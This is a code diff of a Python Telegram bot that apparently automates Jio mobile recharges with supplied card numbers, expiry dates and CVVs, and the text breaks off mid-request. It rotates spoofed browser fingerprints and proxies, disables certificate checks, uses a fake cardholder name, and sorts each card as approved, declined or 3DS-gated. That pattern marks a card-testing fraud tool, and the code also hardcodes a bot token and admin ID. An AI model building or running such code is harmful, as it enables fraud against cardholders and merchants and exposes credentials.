@@ -1,7 +1,7 @@
-# Jio Recharge Bot — v8 (secure token, thread-safe, stable)
-import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, traceback, gc
+# Jio Recharge Bot — curl_cffi based (real results, fast)
+import telebot, re, time, os, sys, json, threading, random, datetime, subprocess, traceback
 from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeout
-from pathlib import Path
+from curl_cffi import requests
 
 try:
     sys.stdout.reconfigure(encoding='utf-8')
@@ -9,13 +9,13 @@ except:
     pass
 
 # =====================================================================
-# TOKEN — env variable preferred, fallback to hardcoded
+# TOKEN
 # =====================================================================
 BOT_TOKEN = os.getenv('BOT_TOKEN', '8970318644:AAHgo5FCRQ8b0rUD5bdgx-8OSqAwLTcxqP0')
 ADMIN_ID = int(os.getenv('ADMIN_ID', '8752143085'))
 
 if not BOT_TOKEN or ':' not in BOT_TOKEN:
-    print("ERROR: BOT_TOKEN not set properly!")
+    print("ERROR: BOT_TOKEN not set!")
     sys.exit(1)
 
 # =====================================================================
@@ -53,111 +53,46 @@ def styled_result_head(status):
     }
     return heads.get(status, f"{E['warn']} <b>UNKNOWN</b>")
 
-status_head = styled_result_head
+# =====================================================================
+# PROFILES
+# =====================================================================
+PROFILES = [
+    {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
+    {"imp":"chrome123","ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","ch":'"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',"plat":'"Linux"',"mob":"?0"},
+    {"imp":"edge101","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0","ch":'"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"chrome120","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","ch":'"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"',"plat":'"Windows"',"mob":"?0"},
+    {"imp":"firefox135","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0","ch":'"Firefox";v="135", "Not_A Brand";v="8"',"plat":'"Windows"',"mob":"?0"},
+]
+SCREENS = [
+    {"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30},
+    {"h":768,"w":1366,"depth":24},{"h":1200,"w":1920,"depth":24},
+    {"h":864,"w":1536,"depth":30},
+]
+LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8","en-US,en;q=0.9,hi;q=0.8"]
+
+def ts(): return str(int(time.time()*1000))
 
 # =====================================================================
-# CHROMIUM LOCATION
+# PLAN PARSING
 # =====================================================================
-_CHROMIUM_READY = threading.Event()
-_CHROMIUM_PATH = {"path": None}
+def iter_plans(pj):
+    for cat in pj.get("planCategories") or []:
+        for sub in cat.get("subCategories") or []:
+            for plan in sub.get("plans") or []:
+                if plan.get("key"):
+                    yield {"key":plan["key"],"amount":float(plan.get("amount") or 0),
+                           "name":plan.get("name") or plan.get("planName") or "",
+                           "category":cat.get("type") or "","validity":plan.get("validity") or ""}
 
-def _find_chromium():
-    import shutil
-    from glob import glob
-    candidates = [
-        "/ms-playwright/chromium-*/chrome-linux/chrome",
-        "/ms-playwright/chromium-*/chrome-linux/headless_shell",
-        "/ms-playwright/chromium_headless_shell-*/chrome-linux/headless_shell",
-        "/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
-        "/root/.cache/ms-playwright/chromium-*/chrome-linux/headless_shell",
-        "/home/*/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
-        "/usr/bin/chromium", "/usr/bin/chromium-browser",
-        "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable",
-        shutil.which("chromium"), shutil.which("chromium-browser"),
-        shutil.which("google-chrome"), shutil.which("google-chrome-stable"),
-    ]
-    for c in candidates:
-        if not c: continue
-        if "*" in c:
-            m = sorted(glob(c))
-            if m: return m[-1]
-        else:
-            if Path(c).exists(): return c
+def plan_by_amount(pj, amount):
+    for p in iter_plans(pj):
+        if p["amount"] == float(amount): return p
     return None
 
-def _verify_chromium_once():
-    print("[BOOT] Verifying Chromium...")
-    found = _find_chromium()
-    if found:
-        _CHROMIUM_PATH["path"] = found
-        _CHROMIUM_READY.set()
-        print(f"[BOOT] Chromium found: {found}")
-        return
-    try:
-        from playwright.sync_api import sync_playwright
-        with sync_playwright() as p:
-            path = p.chromium.executable_path
-            if path and Path(path).exists():
-                _CHROMIUM_PATH["path"] = path
-                _CHROMIUM_READY.set()
-                print(f"[BOOT] Chromium OK: {path}")
-                return
-    except Exception as e:
-        print(f"[BOOT] Check failed: {str(e)[:120]}")
-
-    def installer():
-        print("[BOOT] Installing Chromium...")
-        try: subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "playwright"], timeout=300)
-        except: pass
-        try: subprocess.check_call([sys.executable, "-m", "playwright", "install-deps", "chromium"], timeout=300)
-        except: pass
-        try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
-        except Exception as e:
-            print(f"[BOOT] install failed: {str(e)[:120]}")
-            return
-        found = _find_chromium()
-        if found:
-            _CHROMIUM_PATH["path"] = found
-            _CHROMIUM_READY.set()
-            print(f"[BOOT] Chromium ready: {found}")
-
-    threading.Thread(target=installer, daemon=True).start()
-
-threading.Thread(target=_verify_chromium_once, daemon=True).start()
-
 # =====================================================================
-# ZOMBIE CLEANUP
+# CARD TOOLS
 # =====================================================================
-def _kill_zombie_browsers():
-    try:
-        subprocess.run(["pkill", "-9", "-f", "chrome-linux/chrome"], timeout=10, capture_output=True)
-        subprocess.run(["pkill", "-9", "-f", "headless_shell"], timeout=10, capture_output=True)
-    except: pass
-
-def _zombie_cleanup_loop():
-    while True:
-        time.sleep(600)
-        _kill_zombie_browsers()
-        gc.collect()
-
-threading.Thread(target=_zombie_cleanup_loop, daemon=True).start()
-
-# =====================================================================
-# JIO CORE
-# =====================================================================
-def _jio_dbg(msg): print(f"[jio] {msg}", flush=True)
-
-def _urldecode(s):
-    try:
-        from urllib.parse import unquote
-        return unquote(s)
-    except: return s
-
-def _page_text(page):
-    try: text = page.locator("body").inner_text(timeout=4000)
-    except: text = ""
-    return re.sub(r"\s+", " ", text).strip()
-
 def luhn_check_digit(pan):
     d=[int(x) for x in pan]; d.reverse(); t=0
     for i,x in enumerate(d):
@@ -192,317 +127,419 @@ def parse_card_line(line):
 def card_label(card):
     return f"{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}"
 
+# =====================================================================
+# JIO CHECK — curl_cffi version (from jio_recharge.py)
+# =====================================================================
+def jio_check(phone, amount, card, proxy_str=None):
+    """Full Jio recharge via curl_cffi. Returns (status, message, meta)."""
+    meta = {"merchant": "Jio Recharge", "amount": amount, "plan": ""}
 
-def jio_checkout(phone, amount, card, deadline=None, proxy=None, headless=True):
-    """Each call = its own browser (thread-safe). Returns (status, message, url, meta)."""
-    from playwright.sync_api import sync_playwright
-    if deadline is None: deadline = time.time() + 180
-    meta = {"merchant":"Jio Recharge","amount":amount,"plan":""}
+    pf = random.choice(PROFILES)
+    sc = random.choice(SCREENS)
+    lg = random.choice(LANGS)
+    UA = pf["ua"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]; IMP = pf["imp"]
 
-    p = sync_playwright()
-    pw = p.start()
-    launch_kwargs = {
-        "headless": headless,
-        "args": [
-            "--no-sandbox",
-            "--disable-dev-shm-usage",
-            "--disable-gpu",
-            "--disable-software-rasterizer",
-            "--disable-extensions",
-            "--disable-background-networking",
-            "--disable-sync",
-            "--disable-translate",
-            "--no-first-run",
-            "--no-default-browser-check",
-            "--disable-setuid-sandbox",
-            "--disable-accelerated-2d-canvas",
-            "--disable-accelerated-video-decode",
-            "--disable-features=TranslateUI,BlinkGenPropertyTrees,IsolateOrigins,site-per-process",
-            "--memory-pressure-off",
-        ],
-        "timeout": 90000,
-    }
-    if proxy:
-        launch_kwargs["proxy"] = proxy
+    CARD_NUM = card["pan"]
+    CARD_MM = card["exp_month"]
+    CARD_YY = card["exp_year"]
+    CARD_CVV = card["cvv"]
+    CARD_NAME = "matt henry"
+    CARD_PREFIX = CARD_NUM[:6]
 
-    exe = _CHROMIUM_PATH.get("path") or _find_chromium()
-    if exe and Path(exe).exists():
-        launch_kwargs["executable_path"] = exe
-
+    # build session
     try:
-        browser = pw.chromium.launch(**launch_kwargs)
+        session = requests.Session(impersonate=IMP, verify=False, timeout=45)
     except Exception as e:
-        err = str(e).lower()
-        if "executable doesn't exist" in err or "please run" in err or "host system" in err:
-            try: subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
-            except: pass
-            launch_kwargs.pop("executable_path", None)
-            try:
-                browser = pw.chromium.launch(**launch_kwargs)
-            except Exception as e2:
-                try: pw.stop()
-                except: pass
-                return "error", f"Browser launch failed: {str(e2)[:150]}", "", meta
-        else:
-            try: pw.stop()
-            except: pass
-            return "error", f"Browser launch failed: {str(e)[:150]}", "", meta
+        return "error", f"Session init failed: {str(e)[:100]}", meta
 
-    page = browser.new_page()
+    if proxy_str:
+        pd = _proxy_dict_from_string(proxy_str)
+        if pd: session.proxies.update(pd)
+
+    def jh(ref, ct=None, origin=None, extra=None):
+        h = {"Accept-Language": lg, "Cache-Control": "no-cache", "Connection": "keep-alive",
+             "Pragma": "no-cache", "Referer": ref, "User-Agent": UA, "sec-ch-ua": SEC,
+             "sec-ch-ua-mobile": MOB, "sec-ch-ua-platform": PLAT}
+        if ct: h["Content-Type"] = ct
+        if origin: h["Origin"] = origin
+        if extra: h.update(extra)
+        return h
+
+    def ph(ref, ct=None, origin=None, extra=None):
+        h = {"Accept": "application/json, text/plain, */*", "Accept-Language": lg,
+             "Cache-Control": "no-cache", "Pragma": "no-cache", "Referer": ref,
+             "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB,
+             "sec-ch-ua-platform": PLAT, "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
+             "Sec-Fetch-Site": "same-origin", "x-request-time": ts()}
+        if ct: h["Content-Type"] = ct
+        if origin: h["Origin"] = origin
+        if extra: h.update(extra)
+        return h
+
+    def sget(url, headers, **kw):
+        for a in range(2):
+            try: return session.get(url, headers=headers, timeout=45, **kw)
+            except Exception:
+                if a == 1: raise
+                time.sleep(0.5)
+
+    def spost(url, headers, **kw):
+        for a in range(2):
+            try: return session.post(url, headers=headers, timeout=45, **kw)
+            except Exception:
+                if a == 1: raise
+                time.sleep(0.5)
+
     try:
-        page.goto("https://www.jio.com/selfcare/recharge/mobility",
-                  wait_until="domcontentloaded", timeout=45000)
-        page.wait_for_timeout(2500)
-        frame = page.main_frame
-        callback = {}
-        def _capture_cb(req):
-            if "myjio-b2b-callback" in req.url: callback["url"] = req.url
-        page.on("request", _capture_cb)
-
-        pay_url = frame.evaluate(
-            """async (arg) => {
-                const phone = arg.phone, amt = arg.amt;
-                const tmo = (ms) => new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms));
-                const fj = (u, o) => Promise.race([fetch(u, o), tmo(45000)]);
-                const rn = await fj('/api/jio-recharge-service/recharge/mobility/number/' + phone);
-                if (rn.status !== 200) return {error: true, msg: 'notsub'};
-                const rp = await fj('/api/jio-recharge-service/recharge/plans/serviceId/' + phone);
-                if (rp.status !== 200) return {error: true, msg: 'plans'};
-                const d = await rp.json();
-                let key = null;
-                for (const c of d.planCategories || [])
-                  for (const sc of (c.subCategories || []))
-                    for (const pl of (sc.plans || []))
-                      if (String(pl.amount) === String(amt) && pl.key) { key = pl.key; break; }
-                if (!key) return {error: true, msg: 'noplan'};
-                await fj('/api/jio-recharge-service/recharge/buy', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({planKey: key, selectedService: phone})});
-                const rpay = await fj('/api/jio-recharge-service/recharge/pay', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({addonPlanKeys:[], flexiTopupFlow:false, servicePlanList:[{planKey: key, quantity:1, serviceId: phone}]})});
-                const j = await rpay.json();
-                return {error: false, url: j.paymentURL || null};
-              }""",
-            {"phone": str(phone), "amt": str(amount)},
-        )
-        if pay_url.get("error"):
-            if pay_url.get("msg") == "notsub":
-                return "error", f"Number {phone} is not a Jio prepaid subscriber.", page.url, meta
-            if pay_url.get("msg") == "noplan":
-                return "error", f"No ₹{amount} plan for {phone}.", page.url, meta
-            return "error", f"Could not fetch Jio plans for {phone}.", page.url, meta
-        if not pay_url.get("url"):
-            return "error", f"Could not generate payment link.", page.url, meta
-
-        try: page.goto(pay_url["url"], wait_until="domcontentloaded", timeout=45000)
-        except: pass
-        page.wait_for_timeout(2500)
-        try: page.wait_for_url("**pay.jio.com**", timeout=25000)
-        except: pass
-        page.wait_for_timeout(1500)
-
-        pf = page.main_frame
-        clicked_card = False
-        for _ in range(15):
-            clicked_card = pf.evaluate("""() => {
-              const els=[...document.querySelectorAll('*')];
-              const el=els.find(e=>{const t=(e.innerText||'').trim();return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t)&&t.length<40&&e.children.length<=1&&e.offsetParent!==null;});
-              if(!el)return false;
-              let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
-              if(el.click){el.click();return true;}return false;
-            }""")
-            if clicked_card: break
-            page.wait_for_timeout(800)
-        page.wait_for_timeout(3000)
-
-        for _ in range(20):
-            if "add-new-card" in page.url or "saved-cards" in page.url: break
-            if "cardinalcommerce" in page.url or "3dsecure" in page.url.lower(): break
-            if "home" in page.url and "/JpgWebApp/home" in page.url:
-                pf = page.main_frame
-                pf.evaluate("""() => {
-                  const els=[...document.querySelectorAll('*')];
-                  const el=els.find(e=>{const t=(e.innerText||'').trim();return /Credit\\/Debit|ATM Card|Debit Card|Credit Card/i.test(t)&&t.length<40&&e.children.length<=1&&e.offsetParent!==null;});
-                  if(!el)return false;
-                  let n=el;for(let i=0;i<8&&n;i++){if(/j-listBlock\\b|align-middle/.test((n.className||'').toString())&&n.offsetParent!==null){n.click();return true;}n=n.parentElement;}
-                  if(el.click){el.click();return true;}return false;
-                }""")
-            page.wait_for_timeout(800)
-        page.wait_for_timeout(1500)
-        pf = page.main_frame
-
-        def fresh():
-            nonlocal pf
-            pf = page.main_frame
-
-        def fill(name, val):
-            try:
-                loc = pf.locator(f"input[name='{name}']")
-                if loc.count(): loc.first.fill(val, timeout=3000)
-            except: fresh()
-
-        pan = card.get("pan","").replace(" ","")
-        exp = f"{card.get('exp_month','')}/{card.get('exp_year','')[-2:]}"
-        for _ in range(4):
-            try:
-                fill("Card number", pan)
-                fill("Expiry (MM/YY)", exp)
-                fill("CVV", card.get("cvv",""))
-                fill("Name on the card", "Card Holder")
-            except: fresh()
-            page.wait_for_timeout(400)
-            try:
-                got = pf.locator("input[name='Card number']").first.input_value() \
-                    if pf.locator("input[name='Card number']").count() else ""
-                if got and got.replace(" ","")[:6] == pan[:6]: break
-            except: fresh()
-
-        page.keyboard.press("Tab"); page.wait_for_timeout(400)
-        page.keyboard.press("Tab"); page.wait_for_timeout(3000)
-
-        for _ in range(10):
-            try:
-                clicked = pf.evaluate("""() => {
-                  const b=[...document.querySelectorAll('button')].find(e=>/^Pay\\s|Pay now|Verify & pay/i.test((e.innerText||'').trim()) && !e.disabled);
-                  if(b){b.click(); return (b.innerText||'').slice(0,30);} return null;
-                }""")
-                if clicked: break
-            except: fresh()
-            page.wait_for_timeout(800)
-        page.wait_for_timeout(3000)
-        fresh()
-
+        # 1. Session
         try:
-            pf.evaluate("""() => {
-              const els=[...document.querySelectorAll('*')];
-              const el=els.find(e=>(/INR|INDIAN RUPEE/i.test((e.innerText||'').trim()))&&(e.innerText||'').length<80&&e.children.length<=1);
-              if(el){let n=el;for(let i=0;i<6&&n;i++){if(n.click){n.click();break;}n=n.parentElement;}}
-            }""")
-        except: pf = page.main_frame
-        page.wait_for_timeout(2500)
+            sget("https://www.jio.com/", headers={
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": lg, "Upgrade-Insecure-Requests": "1",
+                "User-Agent": UA, "sec-ch-ua": SEC, "sec-ch-ua-mobile": MOB, "sec-ch-ua-platform": PLAT})
+        except Exception as e:
+            return "error", f"Session failed: {str(e)[:80]}", meta
 
-        for _ in range(20):
-            u = page.url
-            if "cardinalcommerce" in u or "3dsecure" in u.lower(): break
-            if "paytm" in u or "payglocal" in u: break
-            if "easebuzz" in u or "acs" in u:
-                page.wait_for_timeout(800); continue
-            page.wait_for_timeout(800)
+        # 2. Number lookup
+        try:
+            r = sget(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{phone}",
+                headers=jh("https://www.jio.com/", extra={"Accept":"application/json, text/plain, */*",
+                    "Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}))
+            d = r.json()
+        except Exception as e:
+            return "error", f"Number lookup failed: {str(e)[:80]}", meta
 
-        if "payglocal" in page.url:
-            for _ in range(10):
-                try:
-                    pgf = page.main_frame
-                    ziploc = pgf.locator("#gl_billing_addressPostalCode")
-                    if ziploc.count(): ziploc.first.fill("10080", timeout=2500); break
-                except: pass
-                page.wait_for_timeout(800)
-            for _ in range(10):
-                try:
-                    pgf = page.main_frame
-                    if pgf.evaluate("""() => {
-                      const bs=[...document.querySelectorAll('button')];
-                      const b=bs.find(e=>(/\\u20b9/.test(e.innerText||'')&&/Pay/i.test(e.innerText||'')&&!e.disabled));
-                      if(b){b.click();return true;}return false;
-                    }"""): break
-                except: pass
-                page.wait_for_timeout(800)
-            page.wait_for_timeout(3000)
+        if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
+            return "error", "Not a Jio number", meta
 
-        if "paytm" in page.url and "selectCurrency" in page.url:
-            for _ in range(12):
-                if pf.evaluate("""() => {
-                  const els=[...document.querySelectorAll('*')];
-                  const el=els.find(e=>{const t=(e.innerText||'').trim();return /Indian Rupee|INR/i.test(t)&&t.length<60&&e.children.length<=1&&e.offsetParent!==null;});
-                  if(el){let n=el;for(let i=0;i<8&&n;i++){if(n.click&&n.offsetParent!==null){n.click();break;}n=n.parentElement;}return true;}
-                  return false;
-                }"""): break
-                page.wait_for_timeout(800)
-            page.wait_for_timeout(1500)
-            for _ in range(5):
-                if pf.evaluate("""() => {
-                  const b=[...document.querySelectorAll('button')].find(e=>/Proceed|Pay|Continue|Make Payment/i.test((e.innerText||'').trim())&&!e.disabled);
-                  if(b){b.click();return true;}return false;
-                }"""): break
-                page.wait_for_timeout(800)
-            page.wait_for_timeout(2500)
+        primary = d.get("primaryService") or {}
+        billing_type = d.get("billingType") or primary.get("billingType") or "PREPAID"
+        next_value = d.get("nextPage") or billing_type
+        plans_ref = (f"https://www.jio.com/selfcare/recharge/mobility/plans/"
+                     f"?serviceType=mobility&serviceId={phone}&next={next_value}&billingType={billing_type}&entrysource=Widget")
 
-        stalled = 0
-        for i in range(30):
-            page.wait_for_timeout(1200)
-            u = page.url
-            if callback.get("url"):
-                em = re.search(r"errorMessage=([^&]*)", callback["url"])
-                ec = re.search(r"errorCode=([^&]*)", callback["url"])
-                emsg = _urldecode(em.group(1)) if em else ""
-                ecode = ec.group(1) if ec else ""
-                if ecode == "0" or (not ecode and not emsg):
-                    return "success", "Payment done.", u, meta
-                if "declin" in emsg.lower() or (ecode and ecode != "0"):
-                    return "failed", "Declined: " + emsg[:120], u, meta
-            if "cardinalcommerce" in u or "3dsecure" in u.lower(): return "requires_action", "3DS required.", u, meta
-            if "3ds2" in u or "instaproxy" in u:
-                for _ in range(4):
-                    page.wait_for_timeout(1200)
-                    if callback.get("url"): break
-                    if "instaproxy" not in page.url and "3ds2" not in page.url: break
-                if callback.get("url"): continue
-                if "instaproxy" in page.url or "3ds2" in page.url:
-                    return "requires_action", "3DS required.", page.url, meta
-                continue
-            if "payglocal" in page.url and ("retry" in page.url or "payflow-ui/error" in page.url):
-                return "failed", "Declined.", page.url, meta
-            if "payglocal" in page.url:
-                plow = _page_text(page).lower()
-                if any(w in plow for w in ("payment unsuccessful","was not successful","could not process",
-                    "payment failed","transaction was declined","your payment was declined",
-                    "insufficient","declined","not completed","unsuccessful","try again later","try again")):
-                    return "failed", "Declined.", page.url, meta
-                _three_ds = False
-                for f in page.frames:
-                    fu = f.url
-                    if ("authentication.cardinalcommerce.com" in fu and "threedsecure" in fu.lower()) \
-                       or "3ds2/authenticate" in fu or "cruise/stepup" in fu.lower() or "V2/Cruise/StepUp" in fu:
-                        _three_ds = True; break
-                if _three_ds:
-                    resolved = False
-                    for _ in range(12):
-                        page.wait_for_timeout(1200)
-                        cu = page.url; clow = _page_text(page).lower()
-                        if "payglocal" in cu and "retry" in cu: return "failed", "Declined.", page.url, meta
-                        if any(w in clow for w in ("payment unsuccessful","was not successful","could not process",
-                            "transaction was declined","your payment was declined","declined","unsuccessful","insufficient")):
-                            return "failed", "Declined.", page.url, meta
-                        if "termurlpay" in cu or "payments/termurlpay" in cu:
-                            resolved = True; break
-                    if resolved: continue
-                    return "requires_action", "3DS required.", page.url, meta
-                for f in page.frames:
-                    if "step-up-iframe" in (f.name or "") and f.url and f.url != "about:blank" \
-                       and "cardinalcommerce" not in f.url and "fingerprint" not in f.url.lower():
-                        return "requires_action", "3DS required.", page.url, meta
-            if "theia/error" in page.url or ("/error" in page.url and "paytm" in page.url):
-                return "failed", "Declined by Paytm.", page.url, meta
-            if "paytm" in page.url and "theia" in page.url:
-                stalled += 1
-                if stalled > 12: return "unknown", "Stuck on Paytm.", page.url, meta
-            low = _page_text(page).lower()
-            if any(w in low for w in ("declined","transaction failed","could not be processed",
-                "payment failed","not completed","unsuccessful","insufficient","card not","failed")):
-                return "failed", "Declined.", page.url, meta
-            if any(w in low for w in ("transaction successful","recharge successful","successfully recharged",
-                "payment successful","thank you","recharged","top-up successful","recharge done")):
-                return "success", "Payment done.", page.url, meta
-            if "card number" in low and "cv" in low and i > 4:
-                return "failed", "Card rejected, form reset.", page.url, meta
-            if time.time() > deadline: break
-        return "unknown", "Couldn't confirm result.", page.url, meta
-    except Exception as exc:
-        return "error", f"Checkout failed: {str(exc)[:150]}", page.url, meta
-    finally:
-        try: page.close()
+        # 3. Load plans page
+        try:
+            sget("https://www.jio.com/selfcare/recharge/mobility/plans/",
+                headers=jh("https://www.jio.com/", extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin",
+                    "Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
+                params={"serviceType":"mobility","serviceId":phone,"next":next_value,
+                        "billingType":billing_type,"entrysource":"Widget"})
         except: pass
-        try: browser.close()
-        except: pass
-        try: pw.stop()
-        except: pass
+
+        # 4. Plans JSON
+        try:
+            r4 = sget(f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{phone}",
+                headers=jh(plans_ref, extra={"Accept":"*/*","Sec-Fetch-Dest":"empty",
+                    "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}))
+            plans_json = r4.json()
+        except Exception as e:
+            return "error", f"Plans fetch failed: {str(e)[:80]}", meta
+
+        picked = plan_by_amount(plans_json, amount)
+        if not picked:
+            return "error", f"No plan for Rs {amount}", meta
+        plan_key = picked["key"]
+        meta["plan"] = (picked["name"] or picked["category"] or "")[:35]
+
+        # 5. Buy
+        try:
+            r = spost("https://www.jio.com/api/jio-recharge-service/recharge/buy",
+                headers=jh(plans_ref, ct="application/json", origin="https://www.jio.com",
+                    extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
+                json={"planKey":plan_key,"selectedService":phone})
+            if r.status_code != 200:
+                return "error", f"Buy failed ({r.status_code})", meta
+        except Exception as e:
+            return "error", f"Buy failed: {str(e)[:80]}", meta
+
+        # 6. Pay
+        try:
+            r = spost("https://www.jio.com/api/jio-recharge-service/recharge/pay",
+                headers=jh(plans_ref, ct="application/json", origin="https://www.jio.com",
+                    extra={"Accept":"*/*","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
+                json={"addonPlanKeys":[],"flexiTopupFlow":False,
+                      "servicePlanList":[{"planKey":plan_key,"quantity":1,"serviceId":phone}]})
+            payment_url = r.json().get("paymentURL",
+                "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")
+        except Exception as e:
+            return "error", f"Pay init failed: {str(e)[:80]}", meta
+
+        # 7. Redirect
+        try:
+            r = sget(payment_url, headers=jh(plans_ref, extra={
+                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
+                "Sec-Fetch-Site":"same-origin","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
+                allow_redirects=True)
+            fa = re.search(r"action='([^']+)'", r.text)
+            fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r.text)
+            pay_form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
+            pay_form_data = {k: v for k, v in fi}
+        except Exception as e:
+            return "error", f"Redirect failed: {str(e)[:80]}", meta
+
+        # 8. Pay portal
+        try:
+            r = spost(pay_form_url, headers=jh("https://www.jio.com/",
+                ct="application/x-www-form-urlencoded", origin="https://www.jio.com",
+                extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                       "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
+                       "Sec-Fetch-Site":"cross-site","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
+                data=pay_form_data, allow_redirects=True)
+            pay_jio_ref = r.url
+        except Exception as e:
+            return "error", f"Pay portal failed: {str(e)[:80]}", meta
+
+        # 9. Authorize
+        try:
+            r = spost("https://pay.jio.com/jiopg/v1/authorize-card-operation",
+                headers=jh(pay_jio_ref, ct="application/json", origin="https://pay.jio.com",
+                    extra={"Accept":"application/json","Sec-Fetch-Dest":"empty",
+                           "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin"}),
+                json={"paymentMode":"CCDC","cardPrefix":CARD_PREFIX,"isEMISelected":False,
+                      "viewOffer":False,"skuCode":None,"copco":None,"isStoreCreditSelected":None})
+            x_token = r.json().get("token", "")
+            if not x_token:
+                return "error", "Auth token missing", meta
+        except Exception as e:
+            return "error", f"Auth failed: {str(e)[:80]}", meta
+
+        # 10. Card confirm
+        try:
+            r = spost("https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
+                headers=jh(pay_jio_ref, ct="application/json", origin="https://pay.jio.com",
+                    extra={"Accept":"application/json","Sec-Fetch-Dest":"empty",
+                           "Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","x-token":x_token}),
+                json={"cvvNumber":CARD_CVV,"cashBackApplied":"N","isTrxnStatusCheckEnable":"N",
+                      "seqId":"","ccRoutePg":"","customerCardTypeValue":"mastercard","paymentMode":"CCDC",
+                      "offerAppliedByCust":False,"viewOffer":False,"cardType":"ic_mastercard",
+                      "cardNumber":CARD_NUM,"cardTypeText":"MASTERCARD_CARD","expiryMonth":CARD_MM,
+                      "expiryYear":CARD_YY,"cardHolderName":CARD_NAME,"userCardSaveConsent":False,
+                      "browserDetails":{"browserHeader":"application/json","browserJavaEnabled":False,
+                          "browserJavascriptEnabled":True,"browserLanguage":lg.split(",")[0],
+                          "browserColorDepth":sc["depth"],"browserScreenHeight":sc["h"],
+                          "browserScreenWidth":sc["w"],"browserTz":-330,"browserUserAgent":UA}})
+            cd = r.json()
+        except Exception as e:
+            return "error", f"Card confirmation failed: {str(e)[:80]}", meta
+
+        if not cd.get("status"):
+            msg = cd.get("message", "Card confirmation failed")
+            return _classify_decline("CONFIRM_FAIL", msg, ""), meta
+
+        html_form = cd.get("htmlForm", "")
+        if not html_form:
+            return "failed", "No bank form", meta
+
+        # 11. Bank connect
+        try:
+            ea = re.search(r"action='([^']+)'", html_form)
+            ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
+            eu = ea.group(1) if ea else ""
+            ed = {k: v for k, v in ei}
+            if not eu:
+                return "failed", "Bank URL missing", meta
+            r = spost(eu, headers=jh(pay_jio_ref, ct="application/x-www-form-urlencoded",
+                origin="https://pay.jio.com",
+                extra={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                       "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate",
